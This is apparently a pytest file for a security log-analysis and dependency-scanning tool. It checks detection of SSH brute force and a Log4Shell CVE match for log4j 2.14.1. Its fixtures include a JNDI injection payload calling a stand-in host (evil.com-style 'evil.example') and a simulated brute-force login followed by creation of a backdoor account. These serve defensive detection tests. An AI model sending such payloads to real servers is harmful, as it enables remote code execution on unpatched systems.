from __future__ import annotations

from src.tools.cve_match import match_cves
from src.tools.depscan import scan_artifacts
from src.tools.log_parse import parse_logs


def test_brute_force_and_success_after_failures() -> None:
    fails = "\n".join(
        f"Jan 15 03:12:{i:02d} web-prod sshd[{1400+i}]: Failed password for root from 185.220.101.47 port {53000+i} ssh2"
        for i in range(10)
    )
    logs = {
        "auth.log": fails
        + "\nJan 15 03:18:44 web-prod sshd[1890]: Accepted password for ubuntu from 185.220.101.47 port 54001 ssh2\n"
        + "Jan 15 03:19:02 web-prod sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd backup-svc\n"
    }
    kinds = {e.kind for e in parse_logs(logs)}
    assert "brute_force" in kinds
    assert "success_after_failures" in kinds
    assert "account_create" in kinds or "sudo" in kinds


def test_jndi_payload_in_nginx_and_app() -> None:
    logs = {
        "nginx_access.log": (
            '203.0.113.9 - - [15/Jan/2024:03:22:11 +0000] '
            '"GET /api/${jndi:ldap://evil.example/a} HTTP/1.1" 200 1234\n'
        ),
        "app.log": "2024-01-15 03:22:12 ERROR JndiLookup failed for ${jndi:ldap://evil.example/a}\n",
    }
    kinds = {e.kind for e in parse_logs(logs)}
    assert "jndi_exploit" in kinds
    assert "jndi_lookup" in kinds


def test_depscan_and_cve_match_log4j() -> None:
    artifacts = {
        "requirements.txt": "flask==2.2.2\n# java: org.apache.logging.log4j:log4j-core==2.14.1\n",
        "Dockerfile": "FROM openjdk:11\nCOPY log4j-core-2.14.1.jar /app/lib/\n",
    }
    pkgs = scan_artifacts(artifacts)
    names = {p.name for p in pkgs}
    assert "log4j-core" in names
    records = [
        {
            "id": "CVE-2021-44228",
            "title": "Log4Shell",
            "severity": "critical",
            "fixed_version": "2.17.1",
            "packages": [
                {
                    "name": "log4j-core",
                    "aliases": ["org.apache.logging.log4j:log4j-core", "log4j"],
                    "introduced": "2.0",
                    "fixed": "2.17.0",
                }
            ],
        }
    ]
    hits = match_cves(pkgs, records)
    assert any(h.cve_id == "CVE-2021-44228" for h in hits)


def test_parse_logs_fallback_on_unknown_filename() -> None:
    fails = "\n".join(
        f"Jan 15 03:12:{i:02d} web-prod sshd[{1400+i}]: Failed password for root from 185.220.101.47 port {53000+i} ssh2"
        for i in range(10)
    )
    kinds = {e.kind for e in parse_logs({"mylog.txt": fails})}
    assert "brute_force" in kinds


def test_benign_logs_have_no_suspicious_events() -> None:
    from pathlib import Path

    root = Path("data/scenarios/benign")
    events = parse_logs(
        {
            "auth.log": (root / "auth.log").read_text(encoding="utf-8"),
            "nginx_access.log": (root / "nginx_access.log").read_text(encoding="utf-8"),
        }
    )
    kinds = {e.kind for e in events}
    assert not kinds.intersection(
        {
            "brute_force",
            "success_after_failures",
            "jndi_exploit",
            "jndi_lookup",
            "path_traversal",
            "account_create",
            "lateral_movement",
        }
    )


def test_clean_txt_upload_name_is_also_quiet() -> None:
    from pathlib import Path

    text = Path("sample_data/clean.txt").read_text(encoding="utf-8")
    kinds = {e.kind for e in parse_logs({"clean.txt": text})}
    assert "brute_force" not in kinds
    assert "jndi_exploit" not in kinds


def test_log_monitor_skips_model_on_clean_parse() -> None:
    from src.agents.log_monitor import log_monitor_node

    out = log_monitor_node(
        {
            "raw_logs": {"auth.log": "Jan 15 08:02:44 api-prod sshd[2044]: Accepted publickey for deploy from 198.51.100.10 port 60321 ssh2\n"},
            "scenario_id": "benign",
        }
    )
    assert out["findings"] == []
    assert out["visited"] == ["log_monitor"]
    assert out["agent_log"][0]["status"] == "done"
